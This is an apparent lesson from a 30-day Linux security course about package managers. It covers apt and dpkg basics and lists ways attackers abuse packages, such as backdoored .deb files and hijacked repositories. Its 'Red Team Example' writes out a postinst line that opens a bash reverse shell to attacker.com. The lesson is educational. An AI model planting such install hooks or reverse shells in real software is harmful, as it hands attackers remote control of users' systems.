# Day 5 – Linux Package Managers & Dependency Abuse
![30day_linux](https://github.com/user-attachments/assets/f99d5a61-7e2f-4961-b91e-0d6cb0f05c9a)

Package managers are central to Linux systems — and are a potential goldmine for attackers. This lesson covers how they work and how they're abused in real-world hacks.

---

## 📦 What Is a Package Manager?

A package manager handles:
- Installation and removal of software
- Dependency resolution
- System software updates

Different distros use different managers:
- `apt` → Debian-based (Ubuntu, Kali)
- `yum` or `dnf` → RedHat, Fedora
- `pacman` → Arch Linux

---

## 🔧 Key Commands (APT-based distros)

```bash
sudo apt update             # Refresh package lists
sudo apt upgrade            # Update all packages
sudo apt install <tool>     # Install software
sudo apt remove <tool>      # Uninstall
dpkg -l                     # List installed packages
```
Search and list packages:
```
dpkg -l | grep ssh
```

### 📂 Inspect Installed Packages
```
which nmap                 # Path to binary
dpkg -L nmap               # List files installed by a package
```

### 🧠 Attacker Use Cases

| Technique                   | Description                                                                          |
| --------------------------- | ------------------------------------------------------------------------------------ |
| **Dependency Hijacking**    | Create a malicious `.deb` file with the same name as a trusted library or dependency |
| **Backdoored .deb Files**   | Add preinst/postinst scripts to run payloads during install                          |
| **Persistence via Updates** | Fake update packages that re-deploy backdoors during upgrades                        |
| **Hijacking Local Repos**   | If the system pulls from a local mirror, inject payloads via a fake repository       |

### 🧪 Task of the Day
1 - Install and inspect a tool:
```
sudo apt install netcat
which nc
dpkg -L netcat
```
2 - Find scripts run during install:
```
ls -l /var/lib/dpkg/info/netcat*.*
```

3 - Look inside:
```
cat /var/lib/dpkg/info/netcat.postinst
```

### 🔐 Red Team Example
A fake .deb package containing:
```
postinst: bash -i >& /dev/tcp/attacker.com/4444 0>&1
```
When installed, it gives an attacker a reverse shell.

### 📡 Follow us for more:
➡️ https://t.me/cybersecplayground


---

Be ready for **Day 6** — we’ll begin scripting with **Bash**, your weapon for automation and post-exploitation.
